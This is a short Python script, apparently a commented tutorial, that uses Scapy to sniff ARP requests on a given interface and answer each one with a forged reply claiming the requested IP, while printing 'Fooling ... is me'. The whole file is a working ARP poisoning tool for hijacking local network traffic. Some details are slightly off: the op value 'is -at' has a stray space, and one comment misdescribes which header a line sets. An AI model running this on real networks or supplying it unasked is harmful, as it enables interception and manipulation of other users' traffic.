#!/usr/bin/python3

import sys
from scapy.all import sendp, sniff, ARP, Ether
# Here we import all the required modules

if len(sys.argv) < 2:
    print(sys.argv[0] + " <iface >")
    sys.exit(0)
# Here we ensure that the user provided a network interface name at the CL


def arp_poison_callback(packet):
    # Got ARP request?
    if packet[ARP].op == 1:
    # Here we check and confirm that indeed the packet is ARP request, an ARP reply has a value of 2
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        # Here we create a new packet object called answer
        # The `Ether` class is used to create an Ethernet header, and the `ARP` class is used to create an ARP header. 
        # The `Ether` and `ARP` objects are combined using the `/` operator to create a single packet object.
        answer[ARP].op = "is -at"
        # Here the function sets the op field in the ARP header to "is-at" to indicate that this is a response packet.
        answer[ARP].hwdst = packet[ARP].hwsrc
        # Here it sets the destination MAC address in the Ethernet header to be the source MAC address from the captured packet
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc
        # Here it sets the source IP and destination IP in the ARP header to be the opposite of what they were in the captured packet
        # This is because we are sending a response to the ARP request, so the source and destination should be swapped
        
        print("Fooling " + packet[ ARP].psrc + " that " + packet[ARP].pdst + " is me")

        sendp(answer , iface=sys.argv[1])
        # Here we finally send the response packet using the sendp function from Scapy, specifying the network interface to use 

sniff(prn =arp_poison_callback,
      filter="arp",
      iface=sys.argv[1],
      store=0)